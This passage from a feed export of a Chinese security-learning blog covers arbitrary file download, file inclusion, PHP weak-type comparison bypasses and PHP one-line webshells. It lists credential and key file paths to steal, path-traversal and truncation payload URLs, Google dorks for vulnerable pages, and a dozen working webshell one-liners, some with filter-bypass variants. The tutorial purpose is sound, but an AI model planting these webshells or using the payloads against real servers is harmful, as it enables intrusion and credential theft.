class="line">Fastcgi.impersonate</span><br><span class="line">Fastcgi.impersonate</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=</summary>
      
    
    
    
    <category term="相关配置" scheme="https://sinevil.github.io/categories/%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="文本语言" scheme="https://sinevil.github.io/tags/%E6%96%87%E6%9C%AC%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>任意文件下载漏洞</title>
    <link href="https://sinevil.github.io/2021/07/21/renyi/"/>
    <id>https://sinevil.github.io/2021/07/21/renyi/</id>
    <published>2021-07-21T09:03:47.000Z</published>
    <updated>2021-08-08T09:51:31.752Z</updated>
    
    <content type="html"><![CDATA[<p><strong>任意文件下载漏洞</strong></p><ul><li>什么是任意文件下载漏洞</li></ul><p>由于业务需求，很多网站往往需要提供文件(附件)下载的功能块，但是如果对下载的文件没有做限制，直接通过绝对路径对其文件进行下载，那么，恶意用户就可以利用这种方式下载服务器的敏感文件，对服务器进行进一步的威胁和攻击</p><ul><li>利用条件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">存在读文件的函数</span><br><span class="line">读取文件的路径用户可控且未校验或校验不严</span><br><span class="line">输出了文件内容</span><br></pre></td></tr></table></figure><ul><li>漏洞危害</li></ul><p>通过任意文件下载，可以下载服务器的任意文件，web业务的代码，服务器和系统的具体配置信息，也可以下载数据库的配置信息，以及对内网的信息探测等等</p><ul><li>敏感信息路径</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Windows：</span></span><br><span class="line">   C:\boot.ini  //查看系统版本</span><br><span class="line">   C:\Windows\System32\inetsrv\MetaBase.xml  //IIS配置文件</span><br><span class="line">   C:\Windows\repair\sam  //存储系统初次安装的密码</span><br><span class="line">   C:\Program Files\mysql\my.ini  //Mysql配置</span><br><span class="line">   C:\Program Files\mysql\data\mysql\user.MYD  //Mysql root</span><br><span class="line">   C:\Windows\php.ini  //php配置信息</span><br><span class="line">   C:\Windows\my.ini  //Mysql配置信息</span><br><span class="line">   ...</span><br><span class="line"><span class="comment">#Linux：</span></span><br><span class="line">   /root/.ssh/authorized_keys</span><br><span class="line">   /root/.ssh/id_rsa</span><br><span class="line">   /root/.ssh/id_ras.keystore</span><br><span class="line">   /root/.ssh/known_hosts</span><br><span class="line">   /etc/passwd</span><br><span class="line">   /etc/shadow</span><br><span class="line">   /etc/my.cnf</span><br><span class="line">   /etc/httpd/conf/httpd.conf</span><br><span class="line">   /root/.bash_history</span><br><span class="line">   /root/.mysql_history</span><br><span class="line">   /proc/self/fd/fd[0-9]*(文件标识符)</span><br><span class="line">   /proc/mounts</span><br><span class="line">   /porc/config.gz</span><br></pre></td></tr></table></figure><ul><li>漏洞代码</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#任意文件读取</span></span><br><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;test.txt&quot;</span>;</span><br><span class="line">    readfile(<span class="variable">$filename</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;test.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = fopen(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>) or die(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">    <span class="variable">$data</span> = fread(<span class="variable">$fp</span>,filesize(<span class="variable">$filename</span>));</span><br><span class="line">    fclose(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$data</span>;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;test.txt&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#任意文件下载</span></span><br><span class="line">&lt;a href=<span class="string">&quot;http://www.xx.com/a.zip&quot;</span>&gt;Download&lt;/a&gt;</span><br><span class="line"><span class="comment">#header()下载</span></span><br><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;uploads/201607141437284653.jpg&quot;</span>;</span><br><span class="line"></span><br><span class="line">    header(<span class="string">&#x27;Content-Type: imgage/jpeg&#x27;</span>);</span><br><span class="line">    header(<span class="string">&#x27;Content-Disposition: attachment; filename=&#x27;</span>.<span class="variable">$filename</span>);</span><br><span class="line">    header(<span class="string">&#x27;Content-Lengh: &#x27;</span>.filesize(<span class="variable">$filename</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>漏洞利用</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#url</span></span><br><span class="line">readfile.php?file=/etc/passwd</span><br><span class="line">readfile.php?file=../../../../../../../../etc/passwd</span><br><span class="line">readfile.php?file=../../../../../../../../etc/passwd%00</span><br><span class="line"><span class="comment">#google语法</span></span><br><span class="line">inurl:<span class="string">&quot;readfile.php?file=&quot;</span></span><br><span class="line">inurl:<span class="string">&quot;read.php?filename=&quot;</span></span><br><span class="line">inurl:<span class="string">&quot;download.php?file=&quot;</span></span><br><span class="line">inurl:<span class="string">&quot;down.php?file=&quot;</span></span><br></pre></td></tr></table></figure><ul><li>防范方法</li></ul><p>过滤<code>.</code>，使用户不能再url上回溯上级目录</p><p>正则判断用户输入参数的格式</p><p>php.ini配置open_basedir限定文件允许访问范围</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;任意文件下载漏洞&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;什么是任意文件下载漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;由于业务需求，很多网站往往需要提供文件(附件)下载的功能块，但是如果对下载的文件没有做限制，直接通过绝对路径对其文件进行下载，那么，恶意用户就可</summary>
      
    
    
    
    <category term="漏洞总结" scheme="https://sinevil.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="php漏洞" scheme="https://sinevil.github.io/tags/php%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>文件包含漏洞</title>
    <link href="https://sinevil.github.io/2021/07/20/wenjian/"/>
    <id>https://sinevil.github.io/2021/07/20/wenjian/</id>
    <published>2021-07-20T06:42:33.000Z</published>
    <updated>2021-08-08T10:54:16.067Z</updated>
    
    <content type="html"><![CDATA[<p><strong>文件包含漏洞</strong></p><ul><li>原理</li></ul><p>服务器执行代码时，可以通过文件包含函数加载另一个文件的代码，当被包含文件的代码中存在恶意代码时，也会将其解析并且执行，且该漏洞不只是出现在php语言中，还有其他语言，例如，jsp，asp。</p><ul><li>漏洞产生原因</li></ul><p>没有对文件包含的参数进行过滤或者严格的定义，并且参数可以被用户控制</p><ul><li>危害</li></ul><p>服务器的网页被篡改，网站被挂马，服务器被远端控制，被安装后门</p><ul><li>php中的常见函数</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include  <span class="comment">#包含并且运行指定文件，include在出错时产生警告(E_WARNING)，脚本会继续运行</span></span><br><span class="line">include_once  <span class="comment">#在脚本执行期间包含并运行指定文件。该函数和include函数类似，两者唯一的区别是使用该函数时，php会检查指定文件是否已经被包含过，如果是，则不会再次包含</span></span><br><span class="line">require  <span class="comment">#包含并且运行指定文件，require在出错时产生E_COMPILE_ERROR级别的错误，导致脚本中止运行</span></span><br><span class="line">require_once  <span class="comment">#类似于include_once的require</span></span><br></pre></td></tr></table></figure><p><strong>本地文件包含漏洞</strong></p><ul><li>无限制本地文件包含</li></ul><p>无限制本地文件包含漏洞是指代码中没有为包含文件指定特定的前缀或者扩展名，因此攻击者可以利用文件包含漏洞读取操作系统中的其他文件，获取敏感信息，或者执行其他文件中的代码</p><ul><li>常见的敏感信息路径</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Windows系统常见敏感文件</span><br><span class="line">C: \boot.ini          <span class="comment">#系统版本信息</span></span><br><span class="line">C: \xxx\php.ini       <span class="comment">#PHP配置信息</span></span><br><span class="line">C: \xxx\my.ini        <span class="comment">#MySQL配置信息</span></span><br><span class="line">C: \xxx\httpd.conf    <span class="comment">#Apache配置信息</span></span><br><span class="line">Linux系统常见敏感文件</span><br><span class="line">/etc/passwd                  <span class="comment">#Linux系统账号信息</span></span><br><span class="line">/etc/httpd/conf/httpd,conf   <span class="comment">#Apache配置信息</span></span><br><span class="line">/etc/my.conf                 <span class="comment">#MySQL配置信息</span></span><br><span class="line">/usr/etx/php.ini             <span class="comment">#PHP配置信息</span></span><br></pre></td></tr></table></figure><ul><li> 漏洞利用</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#漏洞代码示例：</span></span><br><span class="line">&lt;?php</span><br><span class="line">  <span class="variable">$filename</span>=<span class="variable">$GET_</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">  include(<span class="variable">$filename</span>);</span><br><span class="line">?&gt;  </span><br><span class="line"><span class="comment">#读取文件内容：</span></span><br><span class="line">目录遍历后获取路径，获取的系统中文件内容</span><br><span class="line">htt://www. . /xxx.php?filename=../../../../../../../路径</span><br><span class="line"><span class="comment">#利用无限制本地文件包含漏洞，可以通过文件包含功能执行任意扩展名的文件中的代码</span></span><br><span class="line">http://路径/xxx.php?filename=文件</span><br></pre></td></tr></table></figure><ul><li>有限制本地文件包含</li></ul><p>有限制本地文件上传包含漏洞是指代码中为包含文件指定了特定的前缀或者<code>.php .html</code>等扩展名，攻击者需要绕过前缀或者扩展名过滤，才能利用文件包含漏洞读取操作系统中的其他文件，获取敏感信息，常见的有限制本地文件包含过滤绕过的方式主要有%00截断，路径长度截断，点号截断文件包含这三种</p><ul><li>%00截断文件包含</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#漏洞条件利用条件：</span></span><br><span class="line">magic_quotes_gpc=off</span><br><span class="line">PHP版本低于5.3.4</span><br><span class="line"><span class="comment">#漏洞代码示例</span></span><br><span class="line">&lt;?php</span><br><span class="line">  <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filenmae&#x27;</span>];</span><br><span class="line">  include(<span class="variable">$filename</span>.<span class="string">&quot;.html&quot;</span>);</span><br><span class="line">?&gt;</span><br><span class="line">payload:http://xxx.com/xx.php?filename=../../../../../../../../boot.ini%00</span><br></pre></td></tr></table></figure><ul><li>路径长度截断文件包含</li></ul><p>操作系统存在最大路径长度的限制。可以输入超过最大路径长度的目录，这样系统就会将后面的路径丢弃，导致扩展名截断</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">漏洞利用条件</span><br><span class="line">Windows 下目录的最大路径长度伟256B</span><br><span class="line">Linux 下目录的最大路径长度伟4096B</span><br><span class="line"><span class="comment">#代码示例</span></span><br><span class="line">&lt;?php</span><br><span class="line">  <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filenmae&#x27;</span>];</span><br><span class="line">  include(<span class="variable">$filename</span>.<span class="string">&quot;.html&quot;</span>);</span><br><span class="line">?&gt;</span><br><span class="line">payload:http://xxx,com/xx.php?filename=test.txt/./././././././././././././././././././././././././././././</span><br></pre></td></tr></table></figure><ul><li>点号截断文件包含示例代码</li></ul><p>在windows系统下，点号的长度大于256B时，就可以造成扩展名截断</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filenmae&#x27;</span>];</span><br><span class="line">  include(<span class="variable">$filename</span>.<span class="string">&quot;.html&quot;</span>);</span><br><span class="line">?&gt;</span><br><span class="line">payload:http://xxx,com/xx.php?.........................................................................</span><br></pre></td></tr></table></figure><ul><li>防护措施</li></ul><p>过滤../../   http://  https://</p><p>php.ini配置文件中的allow_url_fopen=off   alllow_url_include=off   magic_quotes_gpc=on</p><p>白名单验证，仅允许包含运行的指定文件</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;文件包含漏洞&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;原理&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;服务器执行代码时，可以通过文件包含函数加载另一个文件的代码，当被包含文件的代码中存在恶意代码时，也会将其解析并且执行，且该漏洞不只是出现在php语言中，还有其他语言，</summary>
      
    
    
    
    <category term="web基础" scheme="https://sinevil.github.io/categories/web%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="Webshell" scheme="https://sinevil.github.io/tags/Webshell/"/>
    
  </entry>
  
  <entry>
    <title>php弱类型比较</title>
    <link href="https://sinevil.github.io/2021/07/20/phpruo/"/>
    <id>https://sinevil.github.io/2021/07/20/phpruo/</id>
    <published>2021-07-20T03:19:58.000Z</published>
    <updated>2021-08-08T09:51:07.115Z</updated>
    
    <content type="html"><![CDATA[<p><strong>php弱类型比较</strong></p><ul><li>强类型与弱类型</li></ul><p>强类型</p><p>所谓强类型(Strongly typed)，顾名思义就是强制数据类型定义的语言。也就是说，一旦一个变量被指定了某个数据类型，如果不经过强制转换，那么它就永远是这个数据类型。Java、.NET、C++等都是强类型语言，在变量使用之前必须声明变量的类型和名称；且不经强制转换不允许两种不同类型的变量互相操作。</p><p>弱类型</p><p>对数据的类型要求并不严格，可以让数据类型互相转换，弱类型的语言对变量的数据类型没有限制，你可以在任何地时候将变量赋值给任意的其他类型的变量，同时变量也可以转换成任意地其他类型的数据</p><ul><li>类型转换问题</li></ul><p>类型转换是无法避免的问题。例如需要将GET或者是POST的参数转换为int类型，或者是两个变量不匹配的时候，PHP会自动地进行变量转换。但是PHP是一个弱类型的语言，导致在进行类型转换的时候会存在很多意想不到的问题</p><ul><li>php弱类型比较实例<a href="https://www.php.net/manual/zh/types.comparisons.php">详情</a></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php中的 &quot;==&quot; 和 &quot;===&quot;</span></span><br><span class="line">“==”和“===”都是用来比较两个数值是否相等的操作符。</span><br><span class="line">当比较的两个值都是相同类型时候“==”和“===”是相等的。</span><br><span class="line">1==1（两个int）1.0==1.0（两个<span class="built_in">float</span>）‘H1TerHub’==’H1TerHub‘（两个字符串</span><br><span class="line">当前后两个值得类型不一样得时候， <span class="string">&quot;==&quot;</span>会自动转换类型</span><br><span class="line">当看到<span class="string">&quot;==&quot;</span>的时候就可以关注是否存在弱类型比较</span><br><span class="line"></span><br><span class="line"><span class="comment">#&quot;==&quot;类型转换的规则</span></span><br><span class="line">1、字符串和数字比较，字符串会被转换成数字。</span><br><span class="line">“admin”==0(<span class="literal">true</span>)//admin被转换成数字，由于admin是字符串，转换失败，int（admin）=0，所以比较结果是<span class="literal">true</span>。</span><br><span class="line"></span><br><span class="line">2、混合字符串转换成数字，看字符串的第一个</span><br><span class="line">“1admin”==1 “2admin”==2</span><br><span class="line"></span><br><span class="line">3、字符串开头以xex开头，x代表数字。会被转换成科学计数法</span><br><span class="line">x*10^x的形式 <span class="comment">#‘2e2’=2*10^2=200</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bool类型的ture跟任意字符串可以弱类型相等</span></span><br><span class="line">&lt;?php</span><br><span class="line">If ( <span class="literal">true</span>=“a”)&#123;</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line">“success”;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#md5</span></span><br><span class="line"><span class="variable">$array1</span>[] = array(</span><br><span class="line"><span class="string">&quot;foo&quot;</span> =&gt; <span class="string">&quot;bar&quot;</span>,</span><br><span class="line"><span class="string">&quot;bar&quot;</span> =&gt; <span class="string">&quot;foo&quot;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="variable">$array2</span> = array(<span class="string">&quot;foo&quot;</span>, <span class="string">&quot;bar&quot;</span>, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br><span class="line">var_dump(md5(<span class="variable">$array1</span>)==var_dump(<span class="variable">$array2</span>));//<span class="literal">true</span></span><br><span class="line">md5()函数的描述是string md5 ( string <span class="variable">$str</span> [, bool <span class="variable">$raw_output</span> = <span class="literal">false</span> ] )，md5()中的需要是一个string类型的参数。但是当你传递一个array时，md5()不会报错，知识会无法正确地求出array的md5值，这样就会导致任意2个array的md5值都会相等</span><br><span class="line"></span><br><span class="line"><span class="comment">#switch</span></span><br><span class="line"><span class="variable">$i</span> =<span class="string">&quot;2abc&quot;</span>;</span><br><span class="line">switch (<span class="variable">$i</span>) &#123;</span><br><span class="line">　　<span class="keyword">case</span> 0:</span><br><span class="line">　　<span class="keyword">case</span> 1:</span><br><span class="line">　　<span class="keyword">case</span> 2:</span><br><span class="line">　　<span class="built_in">echo</span> <span class="string">&quot;i is less than 3 but not negative&quot;</span>;</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line">　　<span class="keyword">case</span> 3:</span><br><span class="line">　　<span class="built_in">echo</span> <span class="string">&quot;i is 3&quot;</span>;</span><br><span class="line">　　&#125;</span><br><span class="line">这个时候程序输出的是i is less than 3 but not negative，是由于switch()函数将<span class="variable">$i</span>进行了类型转换，转换结果为2</span><br><span class="line"></span><br><span class="line"><span class="comment">#Strcmp函数的漏洞</span></span><br><span class="line">Strcmp（str1, str2）是比较两个字符串，如果str1&lt;str2 则返回&lt;0；如果str1大于str2返回&gt;0；如果两者相等，返回0,rcmp函数比较字符串的本质是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值。</span><br><span class="line"><span class="variable">$array</span>=[1,2,3];</span><br><span class="line">　　var_dump(strcmp(<span class="variable">$array</span>,<span class="string">&#x27;123&#x27;</span>)); //<span class="literal">false</span>。</span><br><span class="line"></span><br><span class="line"><span class="comment"># json绕过</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$message</span> = json_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">    <span class="variable">$key</span> =<span class="string">&quot;*********&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$message</span>-&gt;key ==<span class="variable">$key</span> ) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="built_in">echo</span> <span class="string">&quot;~~~~&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">?&gt;</span><br><span class="line">输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于<span class="variable">$key</span>的值，但是<span class="variable">$key</span>的值我们不知道，这时我们构造一个和任意字符串返回为真的数组&#123;“key”:<span class="literal">true</span>&#125;。即可绕过</span><br><span class="line">payload=message=&#123;<span class="string">&quot;key&quot;</span>,<span class="literal">true</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#array_search的漏洞</span></span><br><span class="line">array_search() 函数与 in_array() 一样，在数组中查找一个键值。如果找到了该值，匹配元素的键名会被返回。如果没找到，则返回<span class="literal">false</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$a</span>=array(1,4);</span><br><span class="line">var_dump(array_search(<span class="string">&quot;4admin&quot;</span>,<span class="variable">$a</span>)); // int(0)=&gt; 返回键值1</span><br><span class="line">var_dump(array_search(<span class="string">&quot;1admin&quot;</span>,<span class="variable">$a</span>)); // int(1) ==&gt;返回键值0</span><br><span class="line">这个和之前的类型转换类似，但是如果是array_search(“4admin”,<span class="variable">$a</span>,<span class="literal">true</span>),最后的“<span class="literal">true</span>”会禁止类型转换。</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;php弱类型比较&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;强类型与弱类型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;强类型&lt;/p&gt;
&lt;p&gt;所谓强类型(Strongly typed)，顾名思义就是强制数据类型定义的语言。也就是说，一旦一个变量被指定了某个数据类型，如果不</summary>
      
    
    
    
    <category term="基础语言" scheme="https://sinevil.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="文本语言" scheme="https://sinevil.github.io/tags/%E6%96%87%E6%9C%AC%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>一句话木马</title>
    <link href="https://sinevil.github.io/2021/07/19/yijuhua/"/>
    <id>https://sinevil.github.io/2021/07/19/yijuhua/</id>
    <published>2021-07-19T11:23:05.000Z</published>
    <updated>2021-08-02T09:04:24.445Z</updated>
    
    <content type="html"><![CDATA[<p><strong>php一句话木马</strong></p><p><code> &lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code> </p><ul><li>运行原理</li></ul><p>php代码写在<?php ?> 中是因为这样服务器才能识别其为php代码，然后进行解析</p><p><code>@</code>符号的作用是不报错</p><p>php eval()的作用：把字符串按照php代码来计算，此字符串必须是合法的php代码，且必须以分号结尾</p><p>如果没有在代码字符串中调用return语句，则返回null，如果代码解析错误，则eval()函数返回false</p><p>实际上就是用post方法接收<code>[]</code>中的变量，然后把变量里面的字符串当做php代码来执行</p><ul><li>其他的一句话木马</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST1</span>);?&gt;</span><br><span class="line">&lt;?php <span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);&#125;?&gt;</span><br><span class="line">&lt;?php system(<span class="variable">$_REQUEST1</span>);?&gt;</span><br><span class="line">&lt;?php (<span class="variable">$_</span>=@<span class="variable">$_GET1</span>).@<span class="variable">$_</span>(<span class="variable">$_POST1</span>)?&gt;</span><br><span class="line">&lt;?php eval_r(<span class="variable">$_POST1</span>)?&gt;</span><br><span class="line">&lt;?php @eval_r(<span class="variable">$_POST1</span>)?&gt;  <span class="comment">#容错代码</span></span><br><span class="line">&lt;?php assert(<span class="variable">$_POST1</span>);?&gt;  <span class="comment">#使用Lanker一句话客户端的专家模式执行相关的PHP语句</span></span><br><span class="line">&lt;?<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;cc&#x27;</span>]);?&gt;</span><br><span class="line">&lt;?<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;cc&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;cc&#x27;</span>])?&gt;</span><br><span class="line">&lt;?php @preg_replace(<span class="string">&quot;/[email]/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;h&#x27;</span>],<span class="string">&quot;error&quot;</span>);?&gt;  <span class="comment">#使用这个后,使用菜刀一句话客户端在配置连接的时候在&quot;配置&quot;一栏输入*/:&lt;O&gt;h=@eval_r($_POST1);&lt;/O&gt;</span></span><br><span class="line">&lt;?php <span class="built_in">echo</span> `<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]` ?&gt;</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@eval_r(<span class="variable">$_POST</span>[sb])&lt;/script&gt;  <span class="comment">#绕过&lt;?限制的一句话</span></span><br><span class="line">&lt;?=<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);  <span class="comment">#绕过&lt;?php ?&gt;限制的一句话 </span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;php一句话木马&lt;/strong&gt;&lt;/p&gt;
